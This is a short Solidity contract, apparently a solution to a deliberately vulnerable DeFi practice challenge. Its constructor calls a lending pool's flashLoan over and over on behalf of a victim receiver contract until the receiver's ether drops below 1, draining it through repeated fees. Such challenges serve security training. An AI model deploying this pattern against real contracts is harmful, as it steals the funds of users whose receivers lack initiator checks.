// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract Hose {
    constructor(
        IERC3156FlashBorrower receiver,
        NaiveReceiverLenderPool pool
    ) {
        while (address(receiver).balance >= 1 ether)
            pool.flashLoan(receiver, pool.ETH(), 0, "");
    }
}
